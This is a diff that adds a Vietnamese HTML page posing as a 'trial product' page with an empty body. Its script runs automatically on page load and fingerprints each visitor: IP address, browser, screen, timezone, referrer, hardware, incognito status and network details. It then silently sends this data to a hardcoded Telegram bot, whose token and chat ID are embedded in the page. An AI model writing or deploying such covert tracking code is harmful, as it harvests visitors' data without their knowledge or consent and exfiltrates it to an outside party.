@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sản phẩm dùng thử</title>
+    <script>
+        async function getUserIP() {
+            try {
+                let response = await fetch("https://api64.ipify.org?format=json");
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return "Nothing";
+            }
+        }
+
+        async function isIncognito() {
+            try {
+                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                return new Promise(resolve => {
+                    if (!fs) resolve(false);
+                    fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+                });
+            } catch (e) {
+                return true;
+            }
+        }
+
+        async function sendToTelegram(info) {
+            const TELEGRAM_BOT_TOKEN = '7924244162:AAFtGVkgCnULaZXRNjiIhfXKMCuz-IJ1VvA';  // 🔹 Thay bằng Token bot của bạn
+            const CHAT_ID = '2091846079';  // 🔹 Thay bằng chat_id của bạn
+            const message = `🔍 *Truy cập mới!*\n\n${info}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+                });
+            } catch (error) {
+                console.error("Lỗi khi gửi Telegram:", error);
+            }
+        }
+
+        async function collectData() {
+            let ip = await getUserIP();
+            let browser = navigator.userAgent;
+            let language = navigator.language;
+            let screenRes = `${screen.width}x${screen.height}`;
+            let viewportRes = `${window.innerWidth}x${window.innerHeight}`;
+            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            let referrer = document.referrer || "Truy cập trực tiếp";
+            let platform = navigator.platform;
+            let memory = navigator.deviceMemory || "Không xác định";
+            let cpuCores = navigator.hardwareConcurrency || "Không xác định";
+            let isPrivate = await isIncognito() ? "Có" : "Không";
+            let connection = navigator.connection || {};
+            let connectionType = connection.effectiveType || "Không xác định";
+            let speed = connection.downlink ? `${connection.downlink} Mbps` : "Không xác định";
+            let latency = connection.rtt ? `${connection.rtt} ms` : "Không xác định";
+
+            let data = `
+🌍 *IP*: ${ip}
+🖥 *Trình duyệt*: ${browser}
+🌎 *Ngôn ngữ*: ${language}
+🖼 *Màn hình*: ${screenRes}
+📏 *Cửa sổ trình duyệt*: ${viewportRes}
+⏳ *Múi giờ*: ${timezone}
+🔗 *Nguồn*: ${referrer}
+💻 *Hệ điều hành*: ${platform}
+💾 *RAM*: ~${memory} GB
+⚡ *CPU Cores*: ${cpuCores}
+🔒 *Chế độ ẩn danh*: ${isPrivate}
+📶 *Loại mạng*: ${connectionType}
+🚀 *Tốc độ mạng*: ${speed}
+⏱ *Ping*: ${latency}
+            `;
+
+            sendToTelegram(data);
+        }
+
+        window.onload = collectData;
+    </script>
+</head>
+<body>
+</body>
+</html>
